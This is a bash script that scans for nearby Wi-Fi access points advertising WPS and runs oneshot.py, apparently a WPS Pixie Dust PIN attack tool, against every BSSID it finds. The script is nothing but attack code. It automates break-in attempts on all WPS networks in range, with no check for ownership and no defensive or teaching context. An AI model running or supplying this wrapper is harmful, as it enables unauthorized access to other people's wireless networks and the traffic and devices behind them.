#!/bin/bash

if [ "$1" ]
then
	IFACE=$1
else
	IFACE="wlan0"
fi

TARGETS=$(iw dev $IFACE scan |\
awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC}; $1 == "WPS:" {printf "%s\n",wifi[MAC]["BSSID"]}' |\
cut -d '(' -f 1)

for TARGET in $TARGETS
do
	python3 oneshot.py --bssid $TARGET -K -F -i $IFACE -w
done
